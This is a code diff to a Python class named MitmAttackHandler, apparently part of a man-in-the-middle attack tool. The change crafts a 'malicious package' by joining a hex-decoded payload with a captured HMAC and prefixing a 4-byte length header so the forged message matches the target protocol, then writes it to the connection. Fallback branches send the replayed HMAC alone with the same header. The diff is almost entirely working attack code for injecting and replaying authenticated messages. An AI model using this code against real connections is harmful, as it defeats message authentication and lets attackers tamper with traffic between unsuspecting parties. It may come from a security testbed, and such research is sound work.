@@ -274,14 +274,33 @@ class MitmAttackHandler:
                         if len(hex_str) % 2 != 0:
                             hex_str = hex_str + '0'
                         malicious_payload = binascii.unhexlify(hex_str)
-                        malicious_package = malicious_payload + self.global_state.state['stored_hmac']
+                        
+                        # Create the full message: malicious payload + captured HMAC
+                        message_content = malicious_payload + self.global_state.state['stored_hmac']
+                        
+                        # Add the 4-byte length header (big-endian)
+                        message_length = len(message_content)
+                        length_header = message_length.to_bytes(4, byteorder='big')
+                        
+                        # Final package: [4-byte length][malicious payload][captured HMAC]
+                        malicious_package = length_header + message_content
+                        
                         if self.attack_log:
-                            logging.info(f"[MITM] Crafted malicious package: {len(malicious_payload)} bytes payload + {len(self.global_state.state['stored_hmac'])} bytes HMAC")
+                            logging.info(f"[MITM] Crafted malicious package: {len(length_header)} bytes header + {len(malicious_payload)} bytes payload + {len(self.global_state.state['stored_hmac'])} bytes HMAC = {len(malicious_package)} total bytes")
+                            logging.info(f"[MITM] Message length in header: {message_length}")
                     except Exception as e:
                         logging.error(f"[MITM] Error crafting malicious package: {e}")
-                        malicious_package = self.global_state.state['stored_hmac']
+                        # Fallback: just send HMAC with proper header
+                        message_content = self.global_state.state['stored_hmac']
+                        message_length = len(message_content)
+                        length_header = message_length.to_bytes(4, byteorder='big')
+                        malicious_package = length_header + message_content
                 else:
-                    malicious_package = self.global_state.state['stored_hmac']
+                    # No malicious payload, just send HMAC with proper header
+                    message_content = self.global_state.state['stored_hmac']
+                    message_length = len(message_content)
+                    length_header = message_length.to_bytes(4, byteorder='big')
+                    malicious_package = length_header + message_content
                 
                 writer.write(malicious_package)
                 await writer.drain()
